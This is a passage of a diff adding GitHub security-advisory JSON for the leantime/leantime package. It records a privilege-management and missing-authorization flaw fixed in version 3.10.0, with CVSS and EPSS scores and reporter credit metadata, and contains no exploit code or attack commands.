+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "leantime/leantime"
+        },
+        "vulnerable_version_range": "< 3.10.0",
+        "first_patched_version": "3.10.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "score": 8.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-269",
+        "name": "Improper Privilege Management"
+      },
+      {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "tinyb0y",
+          "id": 39427151,
+          "node_id": "MDQ6VXNlcjM5NDI3MTUx",
+          "avatar_url": "https://avatars.githubusercontent.com/u/39427151?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/tinyb0y",
+          "html_url": "https://github.com/tinyb0y",
+          "followers_url": "https://api.github.com/users/tinyb0y/followers",
+          "following_url": "https://api.github.com/users/tinyb0y/following{/other_user}",
+          "gists_url": "https://api.github.com/users/tinyb0y/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/tinyb0y/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/tinyb0y/subscriptions",
+          "organizations_url": "https://api.github.com/users/tinyb0y/orgs",
+          "repos_url": "https://api.github.com/users/tinyb0y/repos",
+          "events_url": "https://api.github.com/users/tinyb0y/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/tinyb0y/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 3,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "score": 8.8
+    },
+    "epss": {
+      "percentage": 0.00417,
+      "percentile": 0.35772
+    }
+  }
+]
